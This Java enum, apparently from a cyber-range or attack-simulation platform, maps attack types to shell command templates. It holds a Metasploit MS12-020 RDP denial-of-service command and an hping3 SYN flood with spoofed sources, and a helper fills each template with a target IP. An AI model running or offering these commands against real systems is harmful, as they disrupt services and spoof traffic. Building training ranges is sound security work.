package cn.cyberpeace.mp.base.bo;

import java.util.List;

public enum AttackType {
    // 中断
    ZHONGDUAN(1, "msfconsole -q -x \"use auxiliary/dos/windows/rdp/ms12_020_maxchannelids; set RHOSTS ${IP}; run; exit\""),

    // 降效
    JIANGXIAO(2, "hping3 -q -n --rand-source -S -p 80 --flood ${IP}"),

    // 嗅探
    XIUTAN(3, "");

    private int type;

    private String cmd;

    AttackType(int type, String cmd) {
        this.type = type;
        this.cmd = cmd;
    }

    public int getType() {
        return type;
    }

    public String getCmd() {
        return cmd;
    }

    public static AttackType getByType(int type) {
        for (AttackType value : values()) {
            if (value.type == type) {
                return value;
            }
        }
        return null;
    }

    public static String getFormatCmd(int type, List<ImageToolRequest.Params> params) {
        String cmd = getByType(type).getCmd();
        for(var p:params){
            cmd = cmd.replace("${" + p.getName() + "}", p.getValue());
        }
        return cmd;
    }
}
